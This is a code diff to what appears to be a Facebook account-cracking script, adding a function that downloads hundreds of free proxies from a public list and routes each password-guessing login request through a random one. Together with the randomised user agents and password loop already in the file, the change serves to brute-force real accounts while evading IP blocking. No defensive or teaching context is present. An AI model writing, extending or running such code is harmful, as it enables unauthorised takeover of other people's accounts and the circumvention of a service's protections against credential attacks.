@@ -84,6 +84,27 @@ ugen=[]
 uas=[]
 usa = ["Mozilla/5.0 Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/{str(rr(1111,9999))}.{str(rr(20,100))}.{str(rr(20,100))} (KHTML, like Gecko) Version/{str(rr(20,100))}.0.{str(rr(1111,9999))} Safari/{str(rr(1111,9999))}.{str(rr(20,100))}.{str(rr(20,100))}"]
 rr = random.randint
+#-----------------proxies
+def fetch_proxies():
+    try:
+        g = requests.get('https://proxylist.geonode.com/api/proxy-list?limit=500&page=1&sort_by=lastChecked&sort_type=desc')
+        proxies_data = g.json()
+        proxies = proxies_data['data']
+        with open('proxy.txt', 'w') as file:
+            for proxy in proxies:
+                proxy_ip = proxy['ip']
+                proxy_port = proxy['port']
+                proxy_url = f"http://{proxy_ip}:{proxy_port}"
+                file.write(f"{proxy_url}\n")
+        with open('proxy.txt', 'r') as file:
+            saved_proxies = file.readlines()
+        return saved_proxies
+    except requests.exceptions.ConnectionError:
+        sys.exit(f' {R}× {W}InterNet Contention Problem.!')
+    except Exception as e:
+        sys.exit(e)
+
+saved_proxies = fetch_proxies()
 #--------------------------(UA BOX)--------------------------#
 for sat in range(1000):
     a='NokiaX'
@@ -211,6 +232,8 @@ def rcrack1(uid,pwx,tl):
     try:
         for ps in pwx:
             pro = random.choice(ugen)
+            proxy_u = random.choice(saved_proxies).strip()
+            proxies = {'http':f'{proxy_u}'}
             session = requests.Session()
             bi = random.choice([A,B,C,D,E,F,G,H])
             sys.stdout.write(f'\r \033[1;31m[%sLONDLY-XD\033[1;31m]\033[1;34m\033[1;31m[\033[38;5;195m%s/%s\033[1;31m]\033[1;34m\033[38;5;45mOK-\033[38;5;46m%s\r'%(bi,loop,tl,len(oks))),
@@ -241,7 +264,7 @@ def rcrack1(uid,pwx,tl):
             'sec-fetch-site': 'same-origin',
             'upgrade-insecure-requests': '1',
             'user-agent':pro}
-            response = session.post('https://www.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data=log_data,headers=header_freefb)
+            response = session.post('https://www.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data = log_data,headers = header_freefb,proxies = proxies)
             response_text = response.text
             if response.status_code == 200:
               log_cookies=session.cookies.get_dict().keys()
